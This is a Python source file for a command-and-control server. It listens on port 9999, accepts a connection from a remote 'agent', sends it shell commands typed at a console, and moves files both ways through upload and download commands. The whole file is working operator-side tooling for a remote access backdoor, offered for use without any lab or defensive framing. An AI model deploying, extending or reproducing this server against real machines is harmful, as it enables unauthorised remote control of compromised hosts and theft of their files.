import os
import socket


class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def receive_file(self, conn, filename):
        try:
            size_data = conn.recv(10)
            filesize = int(size_data.decode())
            received = 0
            with open(filename, "wb") as f:
                while received < filesize:
                    data = conn.recv(min(1024, filesize - received))
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
        except Exception as e:
            print(f"[-] Error receiving file: {e}")

    def start_server(self):
        serversocket = socket.socket()
        assert self.host and self.port, "Host and port must be specified"
        serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serversocket.bind((self.host, self.port))
        serversocket.listen(1)
        print(f"[*] Listening on {self.host}:{self.port}")

        try:
            conn, addr = serversocket.accept()
            print(f"[*] Connection from {addr}")

            while True:
                command = input("console> ").strip()

                if command.lower() in ["exit", "quit"]:
                    conn.send(b"exit")
                    break

                if command.startswith("upload "):
                    filename = command.split(" ", 1)[1]
                    if not os.path.exists(filename):
                        print(f"[!] File not found: {filename}")
                        continue

                    conn.send(command.encode())
                    ready = conn.recv(1024)
                    if b"[READYFORFILE]" not in ready:
                        print("[!] Agent not ready to receive file.")
                        continue

                    filesize = os.path.getsize(filename)
                    conn.send(str(filesize).zfill(10).encode())  # Send 10-byte size

                    with open(filename, "rb") as f:
                        while chunk := f.read(1024):
                            conn.sendall(chunk)
                    print(f"[+] Sent file: {filename}")
                    continue

                conn.send(command.encode())

                if command.startswith("download "):
                    filename = command.split(" ", 1)[1]
                    self.receive_file(conn, filename)
                    print(f"[+] Received file: {filename}")
                    continue

                output = conn.recv(4096).decode()
                print(output)

        except KeyboardInterrupt:
            print("\n[!] Shutting down.")
        except Exception as e:
            print(f"[!] An error occurred: {e}")
        finally:
            try:
                conn.close()  # pyright: ignore
            except Exception:
                pass
            serversocket.close()
            print("[*] Server offline.")


if __name__ == "__main__":
    host = "0.0.0.0"
    port = 9999
    c2_server = C2Server(host, port)
    c2_server.start_server()
